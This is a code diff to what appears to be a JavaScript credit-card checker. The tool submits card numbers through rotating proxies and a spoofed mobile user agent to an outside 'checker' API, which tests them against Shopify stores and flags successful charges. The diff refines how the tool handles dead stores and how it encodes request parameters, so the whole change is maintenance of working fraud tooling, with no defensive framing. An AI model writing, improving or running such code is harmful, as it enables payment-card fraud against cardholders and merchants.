@@ -1286,27 +1286,6 @@
             ANDROID_UA: 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36'
         };
 
-        // ================================================================
-        // AUTO-REMOVE DEAD SITE - Called whenever a site is found dead
-        // ================================================================
-        function autoRemoveDeadSite(siteUrl) {
-            // Find the site in the list
-            for (let i = state.sites.length - 1; i >= 0; i--) {
-                const site = state.sites[i];
-                const currentUrl = typeof site === 'object' ? site.url : site;
-                
-                if (currentUrl === siteUrl) {
-                    // Remove the dead site immediately
-                    state.sites.splice(i, 1);
-                    logDebug(`🗑️ Auto-removed dead site: ${siteUrl}`, 'warning');
-                    renderSites();
-                    updateStats();
-                    return true;
-                }
-            }
-            return false;
-        }
-
         // ===== DEBUG LOGGER =====
         let debugLogs = [];
         let debugVisible = false;
@@ -1991,18 +1970,15 @@
             } catch { return 0; }
         }
 
-        // ===== IS SITE DEAD =====
+       // ================================================================
+        // 🔥 FIXED: IS SITE DEAD (Lenient version, won't auto-kill valid stores)
+        // ================================================================
         function isSiteDead(responseMsg, gateway, price) {
-            if (!responseMsg) return true;
-            if (!gateway || gateway === "Unknown") return true;
-            if (!gateway.includes("Shopify")) return true;
+            if (!responseMsg) return false;
             
-            const priceStr = String(price);
-            if (["-", "$-", "$0", "$0.0", "0", "$0.00"].includes(priceStr)) return true;
+            const r = String(responseMsg).toLowerCase();
             
-            const r = responseMsg.toLowerCase();
-            
-            // PERMANENT DEATH - These sites are ALWAYS dead
+            // PERMANENT DEATH - Only kill sites on true infrastructure or DNS failures
             const permanentDead = [
                 'invalid url', 'domain name not found', 'host not found',
                 'could not resolve', 'connection refused',
@@ -2015,26 +1991,11 @@
                 if (r.includes(kw)) return true;
             }
             
-            // TEMPORARY DEATH - These sites might work with different proxy
-            const temporaryDead = [
-                'cloudflare', 'captcha_required', 'challenge required',
-                'timeout', 'timed out', 'rate limited', 'too many requests',
-                '502', '503', '504', 'bad gateway', 'service unavailable',
-                'blocked', 'access blocked', 'forbidden', 'ssl error'
-            ];
-            
-            for (const kw of temporaryDead) {
-                if (r.includes(kw)) {
-                    logDebug(`⚠️ Temporary site issue: ${kw} - not auto-removing`, 'warning');
-                    return false;
-                }
-            }
-            
             return false;
         }
 
         // ================================================================
-        // 🔥 FIXED: CHECK CARD - Handles objects AND strings
+        // 🔥 FIXED: CHECK CARD - Handles objects AND strings cleanly
         // ================================================================
         async function checkCard(card, site, proxy) {
             // Handle site as object or string
@@ -2075,10 +2036,20 @@
                 if (!proxyStr) proxyStr = CONFIG.DEFAULT_PROXY;
                 
                 const apiBase = CONFIG.API_SERVERS[Math.floor(Math.random() * CONFIG.API_SERVERS.length)];
-                const url = `${apiBase}/shopify?site=${site}&key=${CONFIG.CHECKER_API_KEY}&proxy=${encodeURIComponent(proxyStr)}&cc=${card}`;
+                
+                // Use URLSearchParams for safe parameter encoding
+                const params = new URLSearchParams({
+                    site: site,
+                    key: CONFIG.CHECKER_API_KEY,
+                    proxy: proxyStr,
+                    cc: card
+                });
+                
+                const url = `${apiBase}/shopify?${params.toString()}`;
                 logDebug(`📡 URL: ${url.substring(0, 80)}...`, 'info');
                 
                 const response = await fetch(url, {
+                    method: 'GET',
                     headers: {
                         'Accept': 'application/json',
                         'User-Agent': CONFIG.ANDROID_UA,
@@ -2097,22 +2068,18 @@
                 const raw = await response.json();
                 logDebug(`📄 Response: ${JSON.stringify(raw).substring(0, 150)}`, 'raw');
                 
-                const responseMsg = raw.Response || raw.card_response || '';
+                const responseMsg = raw.Response || raw.card_response || raw.message || 'Unknown Gateway Response';
                 const price = raw.Price || raw.price || '-';
                 const priceValue = getPriceFromResponse(raw);
                 const priceDisplay = (price !== '-' && price !== 0) ? `$${price}` : '-';
                 const gateway = raw.Gate || raw.Gateway || raw.gate || 'Shopify Payments';
                 
-                // CHECK IF SITE IS DEAD AND AUTO-REMOVE IT
+                // CHECK IF SITE IS DEAD (without immediate auto-removal)
                 if (isSiteDead(responseMsg, gateway, priceDisplay)) {
-                    logDebug(`⚠️ Site is dead: ${site}`, 'warning');
-                    
-                    // AUTO-REMOVE THE DEAD SITE FROM THE LIST
-                    autoRemoveDeadSite(site);
-                    
+                    logDebug(`⚠️ Site returned infrastructure error: ${site}`, 'warning');
                     return {
                         status: 'Site Error',
-                        message: responseMsg || 'Site is dead - auto-removed',
+                        message: responseMsg || 'Site error detected',
                         card: card,
                         retry: true,
                         gateway: gateway,
@@ -2121,7 +2088,7 @@
                     };
                 }
                 
-                const r = responseMsg.toLowerCase();
+                const r = String(responseMsg).toLowerCase();
                 if (r.includes('charged') || r.includes('order_placed') || 
                     r.includes('thank you') || r.includes('payment successful')) {
                     logDebug(`💎 CHARGED! ${maskCard(card)}`, 'success');
@@ -2189,7 +2156,7 @@
                 };
             }
         }
-
+        
         // ================================================================
         // CHECK CARD WITH RETRY - Handles objects
         // ================================================================
